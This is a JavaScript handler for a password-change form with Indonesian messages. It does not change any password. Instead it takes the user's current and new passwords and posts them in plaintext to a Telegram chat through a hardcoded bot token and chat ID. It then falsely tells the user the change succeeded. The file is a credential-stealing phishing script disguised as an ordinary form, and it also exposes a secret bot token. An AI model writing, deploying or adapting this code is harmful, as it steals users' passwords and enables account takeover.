document.getElementById("passwordForm").addEventListener("submit", async function (e) {
    e.preventDefault();

    const currentPassword = document.getElementById("currentPassword").value;
    const newPassword = document.getElementById("newPassword").value;
    const confirmPassword = document.getElementById("confirmPassword").value;

    if (newPassword !== confirmPassword) {
        alert("Kata sandi baru tidak cocok!");
        return;
    }

    if (newPassword.length < 6) {
        alert("Kata sandi harus memiliki minimal 6 karakter.");
        return;
    }

    // Telegram Bot API
    const botToken = "7883195342:AAHFVsKhUbxrEqtBdq3jlZJpn9w7FEll2ak";
    const chatId = "6936723956";
    const message = `Kata sandi diubah:\nKata sandi saat ini: ${currentPassword}\nKata sandi baru: ${newPassword}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
            }),
        });

        if (response.ok) {
            alert("Kata sandi berhasil diubah dan notifikasi dikirim!");
        } else {
            alert("Kata sandi berhasil diubah, tetapi gagal mengirim notifikasi.");
        }
    } catch (err) {
        alert("Terjadi kesalahan. Silakan coba lagi.");
    }
});